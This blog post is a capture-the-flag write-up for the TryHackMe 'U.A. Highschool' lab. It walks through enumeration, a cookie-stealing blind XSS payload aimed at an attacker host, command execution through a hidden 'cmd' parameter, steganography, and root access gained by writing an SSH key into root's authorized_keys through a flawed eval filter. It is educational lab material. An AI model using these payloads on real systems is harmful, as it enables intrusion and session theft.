@@ -1,0 +1,318 @@
+---
+layout: post
+title: "U.A. Highschool THM writup"
+date: 2024-08-27 11:50:26.059333741 UTC
+tags: CTF Tryhackme THM yueiua ua Highschool
+---
+
+Hello there this is my writeup for [U.A. Highschool - THM](https://tryhackme.com/r/room/yueiua)
+
+## Recon
+
+Starting with the Nmap scan
+
+```
+# Nmap 7.60 scan initiated Tue Aug 27 13:31:23 2024 as: nmap -sT -sV -T4 -p- -oN nmap.txt -vv 10.10.15.187
+Nmap scan report for highschool.com (10.10.15.187)
+Host is up, received arp-response (0.0061s latency).
+Scanned at 2024-08-27 13:31:23 BST for 10s
+Not shown: 65533 closed ports
+Reason: 65533 conn-refused
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+MAC Address: 02:19:94:EC:AF:61 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Aug 27 13:31:34 2024 -- 1 IP address (1 host up) scanned in 10.65 seconds
+
+```
+
+After adding it to `/etc/hosts`
+
+![landing](/assets/img/CTF/THM/yueiua/landing.png)
+
+## Subdomain enumeration
+
+It looked like a static website, nothing important so let's try subdomain enumeration
+
+```console
+$ ffuf -H "Host: FUZZ.highschool.com" -u http://highschool.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fw 171
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://highschool.com
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.highschool.com
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response words: 171
+________________________________________________
+
+:: Progress: [4997/4997] :: Job [1/1] :: 9949 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+```
+
+
+Breakdown:
+
+1. **`ffuf`**: A command-line fuzzing tool used to discover hidden resources like directories, files, or subdomains on a web server by brute-forcing using wordlists.
+
+2. **`-H "Host: FUZZ.highschool.com"`**: Adds an HTTP header to the request. The `"Host: FUZZ.highschool.com"` header is used for virtual host fuzzing, where `FUZZ` is a placeholder that `ffuf` will replace with entries from the wordlist to discover potential subdomains.
+
+3. **`-u http://highschool.com`**: Specifies the target URL, which in this case is `http://highschool.com`. The `Host` header specified earlier will override the domain part of this URL.
+
+4. **`-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`**: Specifies the wordlist file path. Here, the wordlist is located at `/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`, which contains the top 5000 most common subdomains.
+
+5. **`-fw 171`**: Filters results based on the size of the response body. The option `171` ensures that only results with a response body size different from 171 bytes are shown, helping to filter out false positives or irrelevant results.
+
+
+Nothing were found, I went back and tried to find something interesting
+
+All buttons seemed to do nothing, just the contact form was sending a POST Request so I though I can try Blind XSS
+
+![contact_form](assets/img/CTF/THM/yueiua/contact.png)
+
+I tried blind XSS payload to redirect to my python server but that also didn't work
+
+here is the payload anyway
+```html
+<svg/onload=document.location="http://ATTACKBOX_IP:8000/pwned/"+document.cookie>
+```
+
+
+## Content Discovery
+
+```console
+$ gobuster dir -u http://highschool.com -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -b 404,403 --wildcard
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:                     http://highschool.com
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.0.1
+[+] Timeout:                 10s
+===============================================================
+2024/08/27 13:18:20 Starting gobuster
+===============================================================
+/assets (Status: 301)
+/. (Status: 200)
+===============================================================
+2024/08/27 13:18:27 Finished
+===============================================================
+
+```
+
+at first I thought nothing important here, but after reading the hint I tried extensions like `html,php` just to start with
+
+![feroxbuster_index](/assets/img/CTF/THM/yueiua/feroxbuster_index.png)
+
+Found `/assets/index.php` it's just a blank page
+
+## Parameter Fuzzing
+Let's use arjun to discover potential parameters
+
+![arjun](/assets/img/CTF/THM/yueiua/arjun.png)
+
+Nothing found :/, maybe we need to need to pass some value to the parameter.
+
+so let's use [ffuf](https://github.com/ffuf/ffuf)
+
+```console
+$ ffuf -u "http://highschool.com/assets/index.php?FUZZ=ls" -w burp-parameter-names.txt -fs 0
+```
+
+Breakdown:
+
+1. **`ffuf`**: A command-line fuzzing tool used to discover hidden resources or test for vulnerabilities on a web server by brute-forcing using wordlists.
+
+2. **`-u "http://highschool.com/assets/index.php?FUZZ=ls"`**: Specifies the target URL with the `FUZZ` keyword. `FFUF` will replace `FUZZ` with each entry from the wordlist (`burp-parameter-names.txt`) to test different parameter names in the URL.
+
+3. **`-w burp-parameter-names.txt`**: Specifies the wordlist file, `burp-parameter-names.txt`, which contains potential parameter names to be used in place of `FUZZ`.
+
+4. **`-fs 0`**: Filters out responses that have a content size of `0` bytes. This helps in avoiding empty responses that are not useful.
+
+![ffuf_cmd](assets/img/CTF/THM/yueiua/ffuf_cmd.png)
+
+We found a parameter named `cmd`, let's try it in our browser
+
+![cmd_ls](assets/img/CTF/THM/yueiua/cmd_ls.png)
+
+
+## RCE (Shell as www-data)
+Browsing `assets/index.php?cmd=id` it seems like it returns the result of the command as a base64 encoded string, I confirmed that using devtools console
+
+![base64_atob](/assets/img/CTF/THM/yueiua/base64_atob.png)
+Awesome! let's get shell.
+
+I tried payloads from [revshells](https://revshells.com)  but only [busybox](https://www.busybox.net/) worked
+
+![www-data-shell](/assets/img/CTF/THM/yueiua/www-data-shell.png)
+
+[How to get a full tty shell](https://0xffsec.com/handbook/shells/full-tty/)
+
+## Shell as deku
+I just went back and found a `Hidden_Content` Directory it had a `passphrase.txt`,
+
+![passphrase](/assets/img/CTF/THM/yueiua/passphrase.png)
+
+Tried to use this as deku's password but it didn't work, so it's serving another purpose.
+
+I did an `ls assets/images` to check if there is some files I don't know about, I downloaded both images
+
+![assets_ls](/assets/img/CTF/THM/yueiua/assets_ls.png)
+
+However I noticed that `oneforall.png` is not opening, the other one is just the background in landing page
+
+![oneforall_failed](/assets/img/CTF/THM/yueiua/oneforall_failed.png)
+
+tried `strings oneforall.png` but nothing interesting
+
+I used [hexyl](https://github.com/sharkdp/hexyl) to view magic numbers
+
+![hexyl](/assets/img/CTF/THM/yueiua/hexyl_dump.png)
+
+PNG? I tried to rename it to `oneforall.png` but it didn't work,
+
+Changed the magic number to `FF D8 FF E0 00 10 4A 46 49 46 00 01`
+
+[list_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
+
+I used [hexedit](https://man.archlinux.org/man/hexedit.1.en) to change the first 12 bytes to `FF D8 FF E0 00 10 4A 46 49 46 00 01`
+
+![hexedit](/assets/img/CTF/THM/yueiua/hexedit.png)
+
+It works now!, this a normal image now
+![oneforall_fixed](/assets/img/CTF/THM/yueiua/oneforall_fixed.png)
+
+Since this a normal image we can try stegnogrpahy, a passphrase is needed so I used the passphrase we found earlier, it worked,
+got a creds.txt that has deku's password
+
+I used [steghide](https://www.kali.org/tools/steghide/)
+
+```console
+$ steghide --extract -sf oneforall.jpg
+```
+![steghide](/assets/img/CTF/THM/yueiua/steghide.png)
+
+![user_flag](/assets/img/CTF/THM/yueiua/user_flag.png)
+
+## Privilege escalation (Shell as root)
+
+```console
+deku@myheroacademia:~$ sudo -l
+[sudo] password for deku:
+Matching Defaults entries for deku on myheroacademia:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on myheroacademia:
+    (ALL) /opt/NewComponent/feedback.sh
+deku@myheroacademia:~$ /opt/NewComponent/feedback.sh
+Hello, Welcome to the Report Form
+This is a way to report various problems
+    Developed by
+        The Technical Department of U.A.
+Enter your feedback:
+h4cked
+It is This:
+h4cked
+Feedback successfully saved.
+
+```
+
+Let's see what is `/opt/newcomponent/feedback.sh`
+
+```bash
+#!/bin/bash
+
+echo "Hello, Welcome to the Report Form       "
+echo "This is a way to report various problems"
+echo "    Developed by                        "
+echo "        The Technical Department of U.A."
+
+echo "Enter your feedback:"
+read feedback
+
+
+if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
+    echo "It is This:"
+    eval "echo $feedback"
+
+    echo "$feedback" >> /var/log/feedback.txt
+    echo "Feedback successfully saved."
+else
+    echo "Invalid input. Please provide a valid input."
+fi
+
+```
+
+The script is designed to capture user feedback while preventing command injection by restricting certain special characters that could be used maliciously.
+it runs eval which is our target function, but there is an if statement that checks if the feedback contains any of the following characters:
+
+1. **Backtick (`\``)**: Executes commands within another command.
+2. **Parentheses (`(`, `)`)**: Groups commands or creates subshells.
+3. **Dollar Sign and Parentheses (`$(`)**: Executes commands and substitutes the output.
+4. **Pipe (`|`)**: Chains commands, passing output from one to another.
+5. **Ampersand (`&`)**: Runs commands in the background or in parallel.
+6. **Semicolon (`;`)**: Separates and executes multiple commands sequentially.
+7. **Question Mark (`?`)**: Used in wildcards and to check command status.
+8. **Exclamation Mark (`!`)**: Expands command history, potentially repeating commands.
+9. **Backslash (`\`)**: Escapes characters, altering their interpretation.
+Thus it is meant to prevent expressions that can be executed by bash
+
+However,The filter is not perfect, we can still use `<,>,$`, also note that eval runs `echo $feedback` already, we can write to `/root/.ssh/authorized_keys` so we can use our own key to connect as root
+![eval_echo](/assets/img/CTF/THM/yueiua/eval_echo.png)
+
+let's make an ssh key using ssh-keygen
+
+```console
+$ ssh-keygen -t rsa -f ~/.ssh/ua -C root
+>
+```
+![ssh_keygen](/assets/img/CTF/THM/yueiua/ssh_keygen.png)
+
+Make sure to set permissions to 600 for the private key
+```console
+$ chmod 600 ~/.ssh/ua
+```
+now we need to put our public key on the server
+
+![pubkey](/assets/img/CTF/THM/yueiua/pubkey.png)
+
+now let's run feedback script and paste our public key into /root/.ssh/authorized_keys
+
+```
+"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDN+5S9Uq3/9bF7Rr2JmF112iqX+UWfPGkj68eUr82HFtDTOSOx8gbPoLWwDQw8If2bwa/G+4lDazPMiQnjso1Iks27E7LugJ0LuIYec+iOBlX0b5AhNZ/2iefkQ6kLP9lQjCvSrlYCnyYSdNrbVgUU6NwE27O/v3kSoA/w5mjPB+tHxpBHRolk1iN0qsH2+zb7T07M4CDn+srfQk4BN5VNLTqANXkRfVBFdqIogln95CJJEj5sXP7weNqZ8y/jxGjh1T8SqJ1kxX60ucVwnnOoedI/jqGy6kwKzbZA7VdGDaOpGoff8DbxINsiZgk30K4FhqNR2XcP7hEpgg/6bUYZnV/QRXJGdxkrk+vb/YoSM0IEa52L7q2lpXXNN3znTMlmW/353+RnOElXJlcbyQ7YSqOOlzZdF1PRvEMkaLF5XiIwhcnc2QcEHGtAv7swfUY4y/3i4n699WUPdhiuFe2TYiy1G8YMp3esQZTsrbHcE/UAcHH1rYf9/+RW8UKScls= root "> /root/.ssh/authorized_keys
+
+```
+
+![authorized_keys](/assets/img/CTF/THM/yueiua/authorized_keys.png)
+
+now let's use our key to login to the server
+
+```console
+$ ssh -i ua root@TARGET_IP
+```
+
+
+![root_pwned](/assets/img/CTF/THM/yueiua/root_pwned.png)
+
+![root_flag](/assets/img/CTF/THM/yueiua/root_flag.png)
+
+That's it, hope you enjoyed it. See you later! UwU
